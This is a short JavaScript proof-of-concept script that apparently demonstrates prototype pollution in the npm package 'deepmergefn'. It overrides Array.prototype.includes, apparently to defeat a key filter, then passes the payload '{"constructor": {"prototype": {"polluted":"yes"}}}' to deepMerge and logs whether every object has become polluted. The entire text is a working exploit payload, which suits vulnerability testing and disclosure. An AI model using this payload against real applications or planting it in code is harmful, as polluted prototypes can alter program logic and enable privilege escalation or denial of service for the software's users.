Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const deepMerge = require('deepmergefn');
console.log({}.polluted);
EVIL_DATA = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
deepMerge({}, EVIL_DATA);
console.log({}.polluted);